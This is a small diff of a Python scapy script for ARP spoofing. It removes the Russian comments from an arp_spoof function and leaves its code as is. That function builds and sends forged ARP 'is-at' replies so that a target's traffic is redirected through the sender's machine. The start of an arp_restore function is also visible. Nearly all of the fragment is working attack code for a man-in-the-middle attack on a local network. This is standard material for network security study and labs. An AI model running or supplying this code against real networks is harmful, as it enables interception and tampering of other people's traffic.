@@ -2,13 +2,10 @@ from scapy.all import *
 import sys
 
 def arp_spoof(dest_ip, dest_mac, source_ip):
-    # Создаем Ethernet-пакет
     ether = Ether(dst = dest_mac)
-    # Создаем ARP-пакет
     arp = ARP(op = 'is-at', psrc = source_ip, hwsrc = get_if_hwaddr(conf.iface), pdst = dest_ip)
-    # Объединяем их
     packet = ether / arp
-    sendp(packet, verbose = False)  # Используем sendp для отправки Ethernet-пакета
+    sendp(packet, verbose = False)  
 
 def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
     ether = Ether(dst = dest_mac)
